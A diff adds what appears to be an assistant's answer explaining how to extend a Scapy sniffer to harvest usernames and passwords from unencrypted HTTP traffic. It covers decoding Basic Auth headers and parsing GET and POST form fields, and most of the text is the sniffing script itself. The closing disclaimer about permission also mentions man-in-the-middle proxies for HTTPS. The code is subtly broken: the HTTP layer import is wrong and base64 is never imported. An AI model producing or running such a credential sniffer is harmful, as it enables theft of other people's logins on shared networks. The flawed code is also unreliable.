@@ -1,0 +1,102 @@
+To extract usernames and passwords from HTTP requests that contain sensitive information,
+you can use Scapy to inspect the HTTP payload and filter out login credentials from form
+data or basic authentication headers. Here's how you can modify your code to extract such data:
+
+1. Check for HTTP Authentication
+
+If the HTTP request uses basic authentication, the username and password are often passed in
+the Authorization header in base64 encoding.
+
+2. Check for URL Parameters (Form Data)
+
+For web forms that pass data via the URL (such as username=foo&password=bar),
+you can parse the URL for parameters.
+
+3. Check for POST Data in the HTTP Payload
+
+In POST requests, login data like username and password is often passed in the body of the request
+(e.g., as form-encoded data).
+
+Here's how you can modify your process_sniffed_packet function to extract usernames and passwords
+from HTTP requests:
+
+    import scapy.all as scapy
+    import http
+
+    def sniff(interface):
+        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")
+
+    def process_sniffed_packet(packet):
+        if packet.haslayer(http.HTTPRequest):
+            raw_data = packet.load
+            # Check if the packet has an HTTP payload (this is the request data)
+            if raw_data:
+                # Try to extract basic authentication data (Authorization header)
+                if b"Authorization" in raw_data:
+                    auth_data = raw_data.split(b"Authorization: ")[1].split(b"\r\n")[0]
+                    auth_data = auth_data.decode()
+                    # Basic auth is encoded in base64, so decode it
+                    decoded_auth = base64.b64decode(auth_data.split(" ")[1]).decode("utf-8")
+                    print("Basic Auth Username/Password:", decoded_auth)
+
+                # Check for form parameters in URL (GET request)
+                elif b"GET" in raw_data:
+                    # Parse the URL parameters (e.g., username=foo&password=bar)
+                    if b"username=" in raw_data and b"password=" in raw_data:
+                        data = raw_data.split(b"GET /")[1].split(b" HTTP/")[0]
+                        params = data.split(b"&")
+                        username = None
+                        password = None
+                        for param in params:
+                            if b"username=" in param:
+                                username = param.split(b"username=")[1].decode()
+                            if b"password=" in param:
+                                password = param.split(b"password=")[1].decode()
+                        if username and password:
+                            print(f"Username: {username}, Password: {password}")
+
+                # Check for POST data (form submissions)
+                elif b"POST" in raw_data:
+                    # If the HTTP request contains form data
+                    if b"username=" in raw_data and b"password=" in raw_data:
+                        form_data = raw_data.split(b"\r\n\r\n")[1]
+                        username = None
+                        password = None
+                        params = form_data.split(b"&")
+                        for param in params:
+                            if b"username=" in param:
+                                username = param.split(b"username=")[1].decode()
+                            if b"password=" in param:
+                                password = param.split(b"password=")[1].decode()
+                        if username and password:
+                            print(f"Username: {username}, Password: {password}")
+
+# Sniff traffic on the specified interface
+# sniff("eth0")  # Example interface name
+
+Key Sections to Focus On:
+
+    Basic Authentication (Authorization header):
+        Extract the Authorization header and decode it from base64 format to reveal
+        the username and password.
+
+    GET Request Parameters:
+        For URLs, the parameters may be passed like GET /login?username=foo&password=bar,
+        so you need to parse the URL for parameters.
+
+    POST Request Form Data:
+        In POST requests, form data like username=foo&password=bar is passed in the body,
+        which you need to extract and parse.
+
+Additional Notes:
+
+    This code assumes that the HTTP traffic is unencrypted (i.e., it's HTTP, not HTTPS).
+    If you're sniffing HTTPS traffic, the data will be encrypted, and you cannot directly
+    view the usernames and passwords.
+
+    To capture HTTPS traffic, you'd need to use techniques like SSL/TLS decryption,
+    but this requires access to the private key of the server or using a man-in-the-middle proxy
+    (which might violate laws or terms of service in many environments).
+
+Make sure you have permission to capture and inspect network traffic,
+as sniffing without consent may be illegal or unethical.
